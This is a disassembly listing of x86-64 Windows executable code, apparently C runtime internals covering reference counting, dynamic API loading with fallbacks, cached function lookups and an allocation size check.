   14000aa0d:	48 8d 05 3c 77 00 00 	lea    0x773c(%rip),%rax        # 0x140012150
   14000aa14:	48 3b c8             	cmp    %rax,%rcx
   14000aa17:	74 10                	je     0x14000aa29
   14000aa19:	b8 01 00 00 00       	mov    $0x1,%eax
   14000aa1e:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000aa25:	00 
   14000aa26:	ff c0                	inc    %eax
   14000aa28:	c3                   	ret
   14000aa29:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000aa2e:	c3                   	ret
   14000aa2f:	cc                   	int3
   14000aa30:	48 85 c9             	test   %rcx,%rcx
   14000aa33:	74 31                	je     0x14000aa66
   14000aa35:	53                   	push   %rbx
   14000aa36:	48 83 ec 20          	sub    $0x20,%rsp
   14000aa3a:	48 8d 05 0f 77 00 00 	lea    0x770f(%rip),%rax        # 0x140012150
   14000aa41:	48 8b d9             	mov    %rcx,%rbx
   14000aa44:	48 3b c8             	cmp    %rax,%rcx
   14000aa47:	74 18                	je     0x14000aa61
   14000aa49:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   14000aa4f:	90                   	nop
   14000aa50:	85 c0                	test   %eax,%eax
   14000aa52:	75 0d                	jne    0x14000aa61
   14000aa54:	e8 77 fa ff ff       	call   0x14000a4d0
   14000aa59:	48 8b cb             	mov    %rbx,%rcx
   14000aa5c:	e8 af d5 ff ff       	call   0x140008010
   14000aa61:	48 83 c4 20          	add    $0x20,%rsp
   14000aa65:	5b                   	pop    %rbx
   14000aa66:	c3                   	ret
   14000aa67:	cc                   	int3
   14000aa68:	48 85 c9             	test   %rcx,%rcx
   14000aa6b:	74 1a                	je     0x14000aa87
   14000aa6d:	48 8d 05 dc 76 00 00 	lea    0x76dc(%rip),%rax        # 0x140012150
   14000aa74:	48 3b c8             	cmp    %rax,%rcx
   14000aa77:	74 0e                	je     0x14000aa87
   14000aa79:	83 c8 ff             	or     $0xffffffff,%eax
   14000aa7c:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000aa83:	00 
   14000aa84:	ff c8                	dec    %eax
   14000aa86:	c3                   	ret
   14000aa87:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000aa8c:	c3                   	ret
   14000aa8d:	cc                   	int3
   14000aa8e:	cc                   	int3
   14000aa8f:	cc                   	int3
   14000aa90:	48 83 ec 28          	sub    $0x28,%rsp
   14000aa94:	48 85 c9             	test   %rcx,%rcx
   14000aa97:	0f 84 96 00 00 00    	je     0x14000ab33
   14000aa9d:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000aaa1:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   14000aaa6:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   14000aaad:	48 85 c0             	test   %rax,%rax
   14000aab0:	74 04                	je     0x14000aab6
   14000aab2:	f0 44 01 08          	lock add %r9d,(%rax)
   14000aab6:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   14000aabd:	48 85 c0             	test   %rax,%rax
   14000aac0:	74 04                	je     0x14000aac6
   14000aac2:	f0 44 01 08          	lock add %r9d,(%rax)
   14000aac6:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   14000aacd:	48 85 c0             	test   %rax,%rax
   14000aad0:	74 04                	je     0x14000aad6
   14000aad2:	f0 44 01 08          	lock add %r9d,(%rax)
   14000aad6:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   14000aadd:	48 85 c0             	test   %rax,%rax
   14000aae0:	74 04                	je     0x14000aae6
   14000aae2:	f0 44 01 08          	lock add %r9d,(%rax)
   14000aae6:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000aaea:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000aaf0:	48 8d 15 61 3c 01 00 	lea    0x13c61(%rip),%rdx        # 0x14001e758
   14000aaf7:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000aafb:	74 0c                	je     0x14000ab09
   14000aafd:	48 8b 10             	mov    (%rax),%rdx
   14000ab00:	48 85 d2             	test   %rdx,%rdx
   14000ab03:	74 04                	je     0x14000ab09
   14000ab05:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000ab09:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000ab0e:	74 0d                	je     0x14000ab1d
   14000ab10:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000ab14:	48 85 d2             	test   %rdx,%rdx
   14000ab17:	74 04                	je     0x14000ab1d
   14000ab19:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000ab1d:	48 83 c0 20          	add    $0x20,%rax
   14000ab21:	49 83 e8 01          	sub    $0x1,%r8
   14000ab25:	75 c9                	jne    0x14000aaf0
   14000ab27:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000ab2e:	e8 35 ff ff ff       	call   0x14000aa68
   14000ab33:	48 83 c4 28          	add    $0x28,%rsp
   14000ab37:	c3                   	ret
   14000ab38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ab3d:	57                   	push   %rdi
   14000ab3e:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab42:	e8 39 cd ff ff       	call   0x140007880
   14000ab47:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   14000ab4e:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000ab54:	8b 05 a6 3c 01 00    	mov    0x13ca6(%rip),%eax        # 0x14001e800
   14000ab5a:	85 c8                	test   %ecx,%eax
   14000ab5c:	74 08                	je     0x14000ab66
   14000ab5e:	48 8b 1f             	mov    (%rdi),%rbx
   14000ab61:	48 85 db             	test   %rbx,%rbx
   14000ab64:	75 2c                	jne    0x14000ab92
   14000ab66:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000ab6b:	e8 20 f1 ff ff       	call   0x140009c90
   14000ab70:	90                   	nop
   14000ab71:	48 8b 15 00 4a 01 00 	mov    0x14a00(%rip),%rdx        # 0x14001f578
   14000ab78:	48 8b cf             	mov    %rdi,%rcx
   14000ab7b:	e8 28 00 00 00       	call   0x14000aba8
   14000ab80:	48 8b d8             	mov    %rax,%rbx
   14000ab83:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000ab88:	e8 57 f1 ff ff       	call   0x140009ce4
   14000ab8d:	48 85 db             	test   %rbx,%rbx
   14000ab90:	74 0e                	je     0x14000aba0
   14000ab92:	48 8b c3             	mov    %rbx,%rax
   14000ab95:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ab9a:	48 83 c4 20          	add    $0x20,%rsp
   14000ab9e:	5f                   	pop    %rdi
   14000ab9f:	c3                   	ret
   14000aba0:	e8 4b c7 ff ff       	call   0x1400072f0
   14000aba5:	90                   	nop
   14000aba6:	cc                   	int3
   14000aba7:	cc                   	int3
   14000aba8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000abad:	57                   	push   %rdi
   14000abae:	48 83 ec 20          	sub    $0x20,%rsp
   14000abb2:	48 8b fa             	mov    %rdx,%rdi
   14000abb5:	48 85 d2             	test   %rdx,%rdx
   14000abb8:	74 46                	je     0x14000ac00
   14000abba:	48 85 c9             	test   %rcx,%rcx
   14000abbd:	74 41                	je     0x14000ac00
   14000abbf:	48 8b 19             	mov    (%rcx),%rbx
   14000abc2:	48 3b da             	cmp    %rdx,%rbx
   14000abc5:	75 05                	jne    0x14000abcc
   14000abc7:	48 8b c7             	mov    %rdi,%rax
   14000abca:	eb 36                	jmp    0x14000ac02
   14000abcc:	48 89 39             	mov    %rdi,(%rcx)
   14000abcf:	48 8b cf             	mov    %rdi,%rcx
   14000abd2:	e8 2d fc ff ff       	call   0x14000a804
   14000abd7:	48 85 db             	test   %rbx,%rbx
   14000abda:	74 eb                	je     0x14000abc7
   14000abdc:	48 8b cb             	mov    %rbx,%rcx
   14000abdf:	e8 ac fe ff ff       	call   0x14000aa90
   14000abe4:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   14000abe8:	75 dd                	jne    0x14000abc7
   14000abea:	48 8d 05 ff 39 01 00 	lea    0x139ff(%rip),%rax        # 0x14001e5f0
   14000abf1:	48 3b d8             	cmp    %rax,%rbx
   14000abf4:	74 d1                	je     0x14000abc7
   14000abf6:	48 8b cb             	mov    %rbx,%rcx
   14000abf9:	e8 92 fc ff ff       	call   0x14000a890
   14000abfe:	eb c7                	jmp    0x14000abc7
   14000ac00:	33 c0                	xor    %eax,%eax
   14000ac02:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ac07:	48 83 c4 20          	add    $0x20,%rsp
   14000ac0b:	5f                   	pop    %rdi
   14000ac0c:	c3                   	ret
   14000ac0d:	cc                   	int3
   14000ac0e:	cc                   	int3
   14000ac0f:	cc                   	int3
   14000ac10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ac15:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000ac1a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000ac1f:	57                   	push   %rdi
   14000ac20:	41 54                	push   %r12
   14000ac22:	41 55                	push   %r13
   14000ac24:	41 56                	push   %r14
   14000ac26:	41 57                	push   %r15
   14000ac28:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac2c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000ac30:	44 8b e1             	mov    %ecx,%r12d
   14000ac33:	4d 8b f1             	mov    %r9,%r14
   14000ac36:	49 8b f0             	mov    %r8,%rsi
   14000ac39:	4c 8b fa             	mov    %rdx,%r15
   14000ac3c:	4d 3b c1             	cmp    %r9,%r8
   14000ac3f:	0f 84 bb 00 00 00    	je     0x14000ad00
   14000ac45:	4c 8d 2d b4 53 ff ff 	lea    -0xac4c(%rip),%r13        # 0x140000000
   14000ac4c:	8b 3e                	mov    (%rsi),%edi
   14000ac4e:	49 8b 9c fd 80 f5 01 	mov    0x1f580(%r13,%rdi,8),%rbx
   14000ac55:	00 
   14000ac56:	90                   	nop
   14000ac57:	48 85 db             	test   %rbx,%rbx
   14000ac5a:	74 0e                	je     0x14000ac6a
   14000ac5c:	48 3b d8             	cmp    %rax,%rbx
   14000ac5f:	0f 85 43 01 00 00    	jne    0x14000ada8
   14000ac65:	e9 89 00 00 00       	jmp    0x14000acf3
   14000ac6a:	49 8b ac fd e0 2d 01 	mov    0x12de0(%r13,%rdi,8),%rbp
   14000ac71:	00 
   14000ac72:	33 d2                	xor    %edx,%edx
   14000ac74:	48 8b cd             	mov    %rbp,%rcx
   14000ac77:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000ac7d:	ff 15 85 55 00 00    	call   *0x5585(%rip)        # 0x140010208
   14000ac83:	48 8b d8             	mov    %rax,%rbx
   14000ac86:	48 85 c0             	test   %rax,%rax
   14000ac89:	0f 85 00 01 00 00    	jne    0x14000ad8f
   14000ac8f:	ff 15 03 54 00 00    	call   *0x5403(%rip)        # 0x140010098
   14000ac95:	83 f8 57             	cmp    $0x57,%eax
   14000ac98:	75 49                	jne    0x14000ace3
   14000ac9a:	8d 58 b0             	lea    -0x50(%rax),%ebx
   14000ac9d:	48 8b cd             	mov    %rbp,%rcx
   14000aca0:	44 8b c3             	mov    %ebx,%r8d
   14000aca3:	48 8d 15 6e 87 00 00 	lea    0x876e(%rip),%rdx        # 0x140013418
   14000acaa:	e8 91 f9 ff ff       	call   0x14000a640
   14000acaf:	85 c0                	test   %eax,%eax
   14000acb1:	74 30                	je     0x14000ace3
   14000acb3:	44 8b c3             	mov    %ebx,%r8d
   14000acb6:	48 8d 15 6b 87 00 00 	lea    0x876b(%rip),%rdx        # 0x140013428
   14000acbd:	48 8b cd             	mov    %rbp,%rcx
   14000acc0:	e8 7b f9 ff ff       	call   0x14000a640
   14000acc5:	85 c0                	test   %eax,%eax
   14000acc7:	74 1a                	je     0x14000ace3
   14000acc9:	45 33 c0             	xor    %r8d,%r8d
   14000accc:	33 d2                	xor    %edx,%edx
   14000acce:	48 8b cd             	mov    %rbp,%rcx
   14000acd1:	ff 15 31 55 00 00    	call   *0x5531(%rip)        # 0x140010208
   14000acd7:	48 8b d8             	mov    %rax,%rbx
   14000acda:	48 85 c0             	test   %rax,%rax
   14000acdd:	0f 85 ac 00 00 00    	jne    0x14000ad8f
   14000ace3:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000ace7:	49 87 84 fd 80 f5 01 	xchg   %rax,0x1f580(%r13,%rdi,8)
   14000acee:	00 
   14000acef:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000acf3:	48 83 c6 04          	add    $0x4,%rsi
   14000acf7:	49 3b f6             	cmp    %r14,%rsi
   14000acfa:	0f 85 4c ff ff ff    	jne    0x14000ac4c
   14000ad00:	33 db                	xor    %ebx,%ebx
   14000ad02:	bf 0e 00 00 00       	mov    $0xe,%edi
   14000ad07:	8b cf                	mov    %edi,%ecx
   14000ad09:	e8 82 ef ff ff       	call   0x140009c90
   14000ad0e:	83 64 24 60 00       	andl   $0x0,0x60(%rsp)
   14000ad13:	48 8d 35 e6 72 01 00 	lea    0x172e6(%rip),%rsi        # 0x140022000
   14000ad1a:	bd 00 01 00 00       	mov    $0x100,%ebp
   14000ad1f:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   14000ad24:	8b d5                	mov    %ebp,%edx
   14000ad26:	44 8d 47 f6          	lea    -0xa(%rdi),%r8d
   14000ad2a:	48 8b ce             	mov    %rsi,%rcx
   14000ad2d:	ff 15 cd 54 00 00    	call   *0x54cd(%rip)        # 0x140010200
   14000ad33:	85 c0                	test   %eax,%eax
   14000ad35:	0f 84 81 00 00 00    	je     0x14000adbc
   14000ad3b:	48 85 db             	test   %rbx,%rbx
   14000ad3e:	48 8b c3             	mov    %rbx,%rax
   14000ad41:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000ad48:	48 0f 44 c1          	cmove  %rcx,%rax
   14000ad4c:	4a 87 04 e6          	xchg   %rax,(%rsi,%r12,8)
   14000ad50:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   14000ad55:	8b d5                	mov    %ebp,%edx
   14000ad57:	44 8d 47 f4          	lea    -0xc(%rdi),%r8d
   14000ad5b:	48 8b ce             	mov    %rsi,%rcx
   14000ad5e:	ff 15 9c 54 00 00    	call   *0x549c(%rip)        # 0x140010200
   14000ad64:	85 c0                	test   %eax,%eax
   14000ad66:	74 54                	je     0x14000adbc
   14000ad68:	8b cf                	mov    %edi,%ecx
   14000ad6a:	e8 75 ef ff ff       	call   0x140009ce4
   14000ad6f:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000ad74:	48 8b c3             	mov    %rbx,%rax
   14000ad77:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000ad7c:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000ad81:	48 83 c4 20          	add    $0x20,%rsp
   14000ad85:	41 5f                	pop    %r15
   14000ad87:	41 5e                	pop    %r14
   14000ad89:	41 5d                	pop    %r13
   14000ad8b:	41 5c                	pop    %r12
   14000ad8d:	5f                   	pop    %rdi
   14000ad8e:	c3                   	ret
   14000ad8f:	48 8b c3             	mov    %rbx,%rax
   14000ad92:	49 87 84 fd 80 f5 01 	xchg   %rax,0x1f580(%r13,%rdi,8)
   14000ad99:	00 
   14000ad9a:	48 85 c0             	test   %rax,%rax
   14000ad9d:	74 09                	je     0x14000ada8
   14000ad9f:	48 8b cb             	mov    %rbx,%rcx
   14000ada2:	ff 15 90 53 00 00    	call   *0x5390(%rip)        # 0x140010138
   14000ada8:	49 8b d7             	mov    %r15,%rdx
   14000adab:	48 8b cb             	mov    %rbx,%rcx
   14000adae:	ff 15 4c 52 00 00    	call   *0x524c(%rip)        # 0x140010000
   14000adb4:	48 8b d8             	mov    %rax,%rbx
   14000adb7:	e9 46 ff ff ff       	jmp    0x14000ad02
   14000adbc:	e8 2f c5 ff ff       	call   0x1400072f0
   14000adc1:	cc                   	int3
   14000adc2:	cc                   	int3
   14000adc3:	cc                   	int3
   14000adc4:	40 53                	rex push %rbx
   14000adc6:	48 83 ec 20          	sub    $0x20,%rsp
   14000adca:	48 8b 05 ff 72 01 00 	mov    0x172ff(%rip),%rax        # 0x1400220d0
   14000add1:	48 8b d9             	mov    %rcx,%rbx
   14000add4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000add8:	74 3b                	je     0x14000ae15
   14000adda:	48 85 c0             	test   %rax,%rax
   14000addd:	75 22                	jne    0x14000ae01
   14000addf:	4c 8d 0d ba 86 00 00 	lea    0x86ba(%rip),%r9        # 0x1400134a0
   14000ade6:	4c 8d 05 af 86 00 00 	lea    0x86af(%rip),%r8        # 0x14001349c
   14000aded:	48 8d 15 ac 86 00 00 	lea    0x86ac(%rip),%rdx        # 0x1400134a0
   14000adf4:	8d 48 1a             	lea    0x1a(%rax),%ecx
   14000adf7:	e8 14 fe ff ff       	call   0x14000ac10
   14000adfc:	48 85 c0             	test   %rax,%rax
   14000adff:	74 14                	je     0x14000ae15
   14000ae01:	48 8b d3             	mov    %rbx,%rdx
   14000ae04:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   14000ae0b:	48 83 c4 20          	add    $0x20,%rsp
   14000ae0f:	5b                   	pop    %rbx
   14000ae10:	e9 fb 3b 00 00       	jmp    0x14000ea10
   14000ae15:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   14000ae1a:	48 83 c4 20          	add    $0x20,%rsp
   14000ae1e:	5b                   	pop    %rbx
   14000ae1f:	c3                   	ret
   14000ae20:	48 83 ec 28          	sub    $0x28,%rsp
   14000ae24:	48 8b 05 d5 71 01 00 	mov    0x171d5(%rip),%rax        # 0x140022000
   14000ae2b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000ae2f:	74 2f                	je     0x14000ae60
   14000ae31:	48 85 c0             	test   %rax,%rax
   14000ae34:	75 21                	jne    0x14000ae57
   14000ae36:	4c 8d 0d ff 85 00 00 	lea    0x85ff(%rip),%r9        # 0x14001343c
   14000ae3d:	33 c9                	xor    %ecx,%ecx
   14000ae3f:	4c 8d 05 f2 85 00 00 	lea    0x85f2(%rip),%r8        # 0x140013438
   14000ae46:	48 8d 15 f3 85 00 00 	lea    0x85f3(%rip),%rdx        # 0x140013440
   14000ae4d:	e8 be fd ff ff       	call   0x14000ac10
   14000ae52:	48 85 c0             	test   %rax,%rax
   14000ae55:	74 09                	je     0x14000ae60
   14000ae57:	48 83 c4 28          	add    $0x28,%rsp
   14000ae5b:	e9 b0 3b 00 00       	jmp    0x14000ea10
   14000ae60:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ae65:	48 83 c4 28          	add    $0x28,%rsp
   14000ae69:	c3                   	ret
   14000ae6a:	cc                   	int3
   14000ae6b:	cc                   	int3
   14000ae6c:	48 ff 25 35 52 00 00 	rex.W jmp *0x5235(%rip)        # 0x1400100a8
   14000ae73:	cc                   	int3
   14000ae74:	48 ff 25 45 52 00 00 	rex.W jmp *0x5245(%rip)        # 0x1400100c0
   14000ae7b:	cc                   	int3
   14000ae7c:	48 ff 25 2d 52 00 00 	rex.W jmp *0x522d(%rip)        # 0x1400100b0
   14000ae83:	cc                   	int3
   14000ae84:	48 8b 05 8d 71 01 00 	mov    0x1718d(%rip),%rax        # 0x140022018
   14000ae8b:	48 ff e0             	rex.W jmp *%rax
   14000ae8e:	cc                   	int3
   14000ae8f:	cc                   	int3
   14000ae90:	48 ff 25 21 52 00 00 	rex.W jmp *0x5221(%rip)        # 0x1400100b8
   14000ae97:	cc                   	int3
   14000ae98:	48 ff 25 39 52 00 00 	rex.W jmp *0x5239(%rip)        # 0x1400100d8
   14000ae9f:	cc                   	int3
   14000aea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aea5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000aeaa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000aeaf:	57                   	push   %rdi
   14000aeb0:	48 83 ec 50          	sub    $0x50,%rsp
   14000aeb4:	4c 8b 15 d5 71 01 00 	mov    0x171d5(%rip),%r10        # 0x140022090
   14000aebb:	41 8b d9             	mov    %r9d,%ebx
   14000aebe:	49 8b f8             	mov    %r8,%rdi
   14000aec1:	8b f2                	mov    %edx,%esi
   14000aec3:	48 8b e9             	mov    %rcx,%rbp
   14000aec6:	49 83 fa ff          	cmp    $0xffffffffffffffff,%r10
   14000aeca:	74 7f                	je     0x14000af4b
   14000aecc:	4d 85 d2             	test   %r10,%r10
   14000aecf:	75 26                	jne    0x14000aef7
   14000aed1:	4c 8d 0d 98 85 00 00 	lea    0x8598(%rip),%r9        # 0x140013470
   14000aed8:	4c 8d 05 89 85 00 00 	lea    0x8589(%rip),%r8        # 0x140013468
   14000aedf:	48 8d 15 8a 85 00 00 	lea    0x858a(%rip),%rdx        # 0x140013470
   14000aee6:	41 8d 4a 12          	lea    0x12(%r10),%ecx
   14000aeea:	e8 21 fd ff ff       	call   0x14000ac10
   14000aeef:	4c 8b d0             	mov    %rax,%r10
   14000aef2:	48 85 c0             	test   %rax,%rax
   14000aef5:	74 54                	je     0x14000af4b
   14000aef7:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   14000aefe:	00 
   14000aeff:	44 8b cb             	mov    %ebx,%r9d
   14000af02:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000af09:	4c 8b c7             	mov    %rdi,%r8
   14000af0c:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000af11:	8b d6                	mov    %esi,%edx
   14000af13:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   14000af1a:	00 
   14000af1b:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000af20:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000af27:	00 
   14000af28:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000af2d:	48 8b cd             	mov    %rbp,%rcx
   14000af30:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000af34:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000af3b:	00 
   14000af3c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000af41:	49 8b c2             	mov    %r10,%rax
   14000af44:	e8 c7 3a 00 00       	call   0x14000ea10
   14000af49:	eb 32                	jmp    0x14000af7d
   14000af4b:	33 d2                	xor    %edx,%edx
   14000af4d:	48 8b cd             	mov    %rbp,%rcx
   14000af50:	e8 3f 00 00 00       	call   0x14000af94
   14000af55:	8b c8                	mov    %eax,%ecx
   14000af57:	44 8b cb             	mov    %ebx,%r9d
   14000af5a:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000af61:	4c 8b c7             	mov    %rdi,%r8
   14000af64:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000af68:	8b d6                	mov    %esi,%edx
   14000af6a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000af71:	00 
   14000af72:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000af77:	ff 15 93 52 00 00    	call   *0x5293(%rip)        # 0x140010210
   14000af7d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000af82:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000af87:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000af8c:	48 83 c4 50          	add    $0x50,%rsp
   14000af90:	5f                   	pop    %rdi
   14000af91:	c3                   	ret
   14000af92:	cc                   	int3
   14000af93:	cc                   	int3
   14000af94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000af99:	57                   	push   %rdi
   14000af9a:	48 83 ec 20          	sub    $0x20,%rsp
   14000af9e:	48 8b 05 fb 70 01 00 	mov    0x170fb(%rip),%rax        # 0x1400220a0
   14000afa5:	8b fa                	mov    %edx,%edi
   14000afa7:	48 8b d9             	mov    %rcx,%rbx
   14000afaa:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000afae:	74 33                	je     0x14000afe3
   14000afb0:	48 85 c0             	test   %rax,%rax
   14000afb3:	75 22                	jne    0x14000afd7
   14000afb5:	4c 8d 0d cc 84 00 00 	lea    0x84cc(%rip),%r9        # 0x140013488
   14000afbc:	4c 8d 05 bd 84 00 00 	lea    0x84bd(%rip),%r8        # 0x140013480
   14000afc3:	48 8d 15 be 84 00 00 	lea    0x84be(%rip),%rdx        # 0x140013488
   14000afca:	8d 48 14             	lea    0x14(%rax),%ecx
   14000afcd:	e8 3e fc ff ff       	call   0x14000ac10
   14000afd2:	48 85 c0             	test   %rax,%rax
   14000afd5:	74 0c                	je     0x14000afe3
   14000afd7:	8b d7                	mov    %edi,%edx
   14000afd9:	48 8b cb             	mov    %rbx,%rcx
   14000afdc:	e8 2f 3a 00 00       	call   0x14000ea10
   14000afe1:	eb 08                	jmp    0x14000afeb
   14000afe3:	48 8b cb             	mov    %rbx,%rcx
   14000afe6:	e8 fd 1f 00 00       	call   0x14000cfe8
   14000afeb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000aff0:	48 83 c4 20          	add    $0x20,%rsp
   14000aff4:	5f                   	pop    %rdi
   14000aff5:	c3                   	ret
   14000aff6:	cc                   	int3
   14000aff7:	cc                   	int3
   14000aff8:	48 83 ec 28          	sub    $0x28,%rsp
   14000affc:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000b001:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000b006:	ba 00 01 00 00       	mov    $0x100,%edx
   14000b00b:	48 8d 0d ee 6f 01 00 	lea    0x16fee(%rip),%rcx        # 0x140022000
   14000b012:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b018:	ff 15 e2 51 00 00    	call   *0x51e2(%rip)        # 0x140010200
   14000b01e:	85 c0                	test   %eax,%eax
   14000b020:	0f 95 c0             	setne  %al
   14000b023:	48 83 c4 28          	add    $0x28,%rsp
   14000b027:	c3                   	ret
   14000b028:	48 83 ec 28          	sub    $0x28,%rsp
   14000b02c:	48 8b 05 e5 6f 01 00 	mov    0x16fe5(%rip),%rax        # 0x140022018
   14000b033:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b037:	75 04                	jne    0x14000b03d
   14000b039:	33 c0                	xor    %eax,%eax
   14000b03b:	eb 22                	jmp    0x14000b05f
   14000b03d:	48 85 c0             	test   %rax,%rax
   14000b040:	75 20                	jne    0x14000b062
   14000b042:	4c 8d 0d 0f 84 00 00 	lea    0x840f(%rip),%r9        # 0x140013458
   14000b049:	4c 8d 05 00 84 00 00 	lea    0x8400(%rip),%r8        # 0x140013450
   14000b050:	48 8d 15 01 84 00 00 	lea    0x8401(%rip),%rdx        # 0x140013458
   14000b057:	8d 48 03             	lea    0x3(%rax),%ecx
   14000b05a:	e8 b1 fb ff ff       	call   0x14000ac10
   14000b05f:	48 85 c0             	test   %rax,%rax
   14000b062:	0f 95 c0             	setne  %al
   14000b065:	48 83 c4 28          	add    $0x28,%rsp
   14000b069:	c3                   	ret
   14000b06a:	cc                   	int3
   14000b06b:	cc                   	int3
   14000b06c:	40 53                	rex push %rbx
   14000b06e:	48 83 ec 20          	sub    $0x20,%rsp
   14000b072:	84 c9                	test   %cl,%cl
   14000b074:	75 2f                	jne    0x14000b0a5
   14000b076:	48 8d 1d 03 45 01 00 	lea    0x14503(%rip),%rbx        # 0x14001f580
   14000b07d:	48 8b 0b             	mov    (%rbx),%rcx
   14000b080:	48 85 c9             	test   %rcx,%rcx
   14000b083:	74 10                	je     0x14000b095
   14000b085:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000b089:	74 06                	je     0x14000b091
   14000b08b:	ff 15 a7 50 00 00    	call   *0x50a7(%rip)        # 0x140010138
   14000b091:	48 83 23 00          	andq   $0x0,(%rbx)
   14000b095:	48 83 c3 08          	add    $0x8,%rbx
   14000b099:	48 8d 05 98 45 01 00 	lea    0x14598(%rip),%rax        # 0x14001f638
   14000b0a0:	48 3b d8             	cmp    %rax,%rbx
   14000b0a3:	75 d8                	jne    0x14000b07d
   14000b0a5:	b0 01                	mov    $0x1,%al
   14000b0a7:	48 83 c4 20          	add    $0x20,%rsp
   14000b0ab:	5b                   	pop    %rbx
   14000b0ac:	c3                   	ret
   14000b0ad:	cc                   	int3
   14000b0ae:	cc                   	int3
   14000b0af:	cc                   	int3
   14000b0b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b0b5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b0ba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b0bf:	57                   	push   %rdi
   14000b0c0:	48 83 ec 20          	sub    $0x20,%rsp
   14000b0c4:	49 8b e8             	mov    %r8,%rbp
   14000b0c7:	48 8b da             	mov    %rdx,%rbx
   14000b0ca:	48 8b f1             	mov    %rcx,%rsi
   14000b0cd:	48 85 d2             	test   %rdx,%rdx
   14000b0d0:	74 1d                	je     0x14000b0ef
   14000b0d2:	33 d2                	xor    %edx,%edx
   14000b0d4:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000b0d8:	48 f7 f3             	div    %rbx
   14000b0db:	49 3b c0             	cmp    %r8,%rax
   14000b0de:	73 0f                	jae    0x14000b0ef
   14000b0e0:	e8 87 ce ff ff       	call   0x140007f6c
   14000b0e5:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000b0eb:	33 c0                	xor    %eax,%eax
   14000b0ed:	eb 41                	jmp    0x14000b130
